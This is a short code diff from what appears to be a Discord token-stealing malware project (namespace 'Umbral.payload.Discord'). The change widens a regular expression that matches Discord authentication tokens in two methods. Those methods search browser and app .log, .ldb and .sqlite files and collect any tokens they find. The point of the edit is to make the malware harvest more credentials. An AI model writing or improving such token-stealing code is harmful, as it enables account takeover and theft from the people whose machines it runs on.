@@ -95,7 +95,7 @@ namespace Umbral.payload.Discord
         static private async Task MethodA(string path)
         {
             string[] allowedExtentions = { ".log", ".ldb" };
-            Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", RegexOptions.Compiled);
+            Regex regex = new Regex(@"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}", RegexOptions.Compiled);
 
             var processes = new List<Task>();
             var obtainedTokens = new List<string>();
@@ -227,7 +227,7 @@ namespace Umbral.payload.Discord
         {
             var processes = new List<Task>();
             var obtainedTokens = new List<string>();
-            Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", RegexOptions.Compiled);
+            Regex regex = new Regex(@"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}", RegexOptions.Compiled);
 
             string[] files = await Task.Run(() => Directory.GetFiles(path, "*.sqlite", SearchOption.AllDirectories));
 
